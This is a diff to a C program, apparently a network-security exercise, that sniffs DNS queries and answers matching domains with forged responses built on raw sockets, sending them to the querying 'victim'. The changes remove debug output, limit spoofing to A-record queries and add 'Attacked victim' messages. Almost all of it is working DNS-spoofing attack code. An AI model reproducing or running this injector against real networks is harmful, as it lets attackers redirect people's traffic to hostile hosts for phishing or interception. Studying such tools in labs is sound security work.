@@ -10,7 +10,6 @@
 #include <assert.h>
 #include <errno.h>
 
-int	packet_count = 0;
 
 // structure definition at https://www.winpcap.org/docs/docs_40_2/html/group__wpcap__tut6.html
 /* 4 bytes IP address */
@@ -167,7 +166,6 @@ send_spoofed_dns_response(u_char	*dns_req,
     	iph->tos = 0;
 	ip_len = (iph->ver_ihl & 0xf)*4; 
     	iph->tlen = htons(ip_len + 8 + len + sizeof(dns_response)); 
-	printf("\nIP header length = %d\n", ip_len);
     	iph->identification = htons(1111);
     	iph->flags_fo = htons(16384);       
     	iph->ttl = 255;            
@@ -193,10 +191,6 @@ send_spoofed_dns_response(u_char	*dns_req,
 	spoofed_response->len = htons(4);
 	inet_pton(AF_INET, target_ip, &(spoofed_response->ip));
 
-	printf("\nOriginal message:\n");
-	print_payload(dns_req, len);
-	printf("\nSpoofed DNS response:\n");
-	print_payload(dns_res + ip_len + 8, len + sizeof(dns_response));
 	// ========
 
 	soc = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
@@ -218,21 +212,14 @@ send_spoofed_dns_response(u_char	*dns_req,
 	udp->sport = htons(53);
 	udp->dport = dest_port;
 	udp->len = htons(len + sizeof(dns_response) + 8);
-	printf("\nUDP header length = %d\n", htons(udp->len));
 	udp->crc = 0;
 
-        printf("\nTotal DNS response:\n");
-        print_payload(dns_res, len + sizeof(dns_response) + 8 + ip_len);
 	// =========
 		
 	bzero((char *) &victim_addr, sizeof(victim_addr));
     	victim_addr.sin_family = AF_INET;
     	victim_addr.sin_port = dest_port;
 	victim_addr.sin_addr.s_addr = *dest_ip;
-
-	inet_ntop(AF_INET, &(victim_addr.sin_addr), temp, INET_ADDRSTRLEN);
-	printf("\nVictim IP address = %s\t", temp);
-	printf("Port = %d\n", ntohs(victim_addr.sin_port));
 
 	status = sendto(soc, dns_res, len + sizeof(dns_response) + 8 + ip_len, 0, 
 			(struct sockaddr *)&victim_addr, sizeof(victim_addr));
@@ -241,13 +228,12 @@ send_spoofed_dns_response(u_char	*dns_req,
 		assert(0);
 	}
 
-	printf("\nSent spoofed response successfully !\n");
+	inet_ntop(AF_INET, &(victim_addr.sin_addr), temp, INET_ADDRSTRLEN);
+	printf("Attacked victim @%s ", temp);
 	// ========
 
 	close(soc);
-	assert(0);
 	return 0;
-
 }
 
 int
@@ -322,29 +308,7 @@ process_packet(	u_char 				*attack_filename,
 	if (ntohs(udp->dport) != 53)
 		return;
 
-        packet_count++;
-        printf("\n%dth packet: ", packet_count);
-
-        printf("\nSource IP Address:");
-        printf(" %d.%d.%d.%d ", p_hdr->saddr.byte1, p_hdr->saddr.byte2, p_hdr->saddr.byte3, p_hdr->saddr.byte4);
-        printf("\tDestination IP Address:");
-        printf(" %d.%d.%d.%d ", p_hdr->daddr.byte1, p_hdr->daddr.byte2, p_hdr->daddr.byte3, p_hdr->daddr.byte4);
-
-        printf("\nUDP packet ");
-        printf("\tSource Port: %d ", ntohs(udp->sport));
-        printf("\tDestn Port: %d", ntohs(udp->dport));
-        printf("\tUDP Length = %lu", (size_t)header->len - (14 + ip_header_len + 8));
-
-
-	printf("\n============");
-	printf("\nUDP PAYLOAD:");
-	printf("\n============\n");
-	print_payload(packet + 14 + ip_header_len + 8, header->len - (14 + ip_header_len + 8));
-
 	dns = (struct dns_header *)(packet + 14 + ip_header_len + 8);
-	printf("\nDNS ID = %d\n", ntohs(dns->id));
-	printf("\nDNS flags = %d\n", ntohs(dns->flags));
-	printf("\nNumber of DNS questions = %d\n", ntohs(dns->questions));
 
 	ptr = (u_char *)(packet + 14 + ip_header_len + 8 + 12);
 	for (i = 0, j = 0; i < ntohs(dns->questions); i++) {
@@ -356,18 +320,15 @@ process_packet(	u_char 				*attack_filename,
 		}
 		domain_name[j - 1] = '\0';
 		ptr = ptr + 1;
-		printf("\nDomain name = %s\n", domain_name);
                 quest = (struct dns_question *)ptr;
-                printf("\nQuestion qtype = %d\n", ntohs(quest->qtype));
-                printf("\nQuestion qclass = %d\n", ntohs(quest->qclass));
 		ptr = ptr + 4;
+		if (ntohs(quest->qtype) != 1)
+			return;
 
 		status = 0;
 		status = check_attack_target(domain_name, attack_filename, target_ip);
 		if (status == 0)
 			continue;
-
-		printf("\ntarget IP = %s\n", target_ip);
 
 		status = send_spoofed_dns_response(packet + (14 + ip_header_len + 8),
 						   target_ip, 
@@ -376,9 +337,10 @@ process_packet(	u_char 				*attack_filename,
 						   udp->sport);
 		if (status != 0) {
 			printf("\nUnable to send spoofed DNS response to target !\n");
+			return;
 		}
+		printf("with fake data (%s, %s)\n", domain_name, target_ip);
 	}
-	printf("\n=======================================================================\n");
 }
 
 void
@@ -436,11 +398,11 @@ int main(int argc, char **argv) {
 		switch(option) {
 			case 'i':
 				interface = optarg;
-				printf("\nSniffing on interface: %s\n", interface);
+				printf("Sniffing on interface: %s\n", interface);
 			break;
 			case 'f':
 				attack_filename = optarg;
-				printf("\nReading from attack file: %s\n", attack_filename);
+				printf("Reading from attack file: %s\n", attack_filename);
 				if( access(attack_filename, F_OK) == -1 ) {
 					printf("\nAttack file %s not present !\n", attack_filename);
 					return 0;
@@ -476,7 +438,7 @@ int main(int argc, char **argv) {
         	}
         	printf("\nSniffing on default device: %s\n", interface);
 	}
-
+	printf("===========================================\n");
 	sniff_packet(interface, bpf_filter, attack_filename);
 
 	return 0;
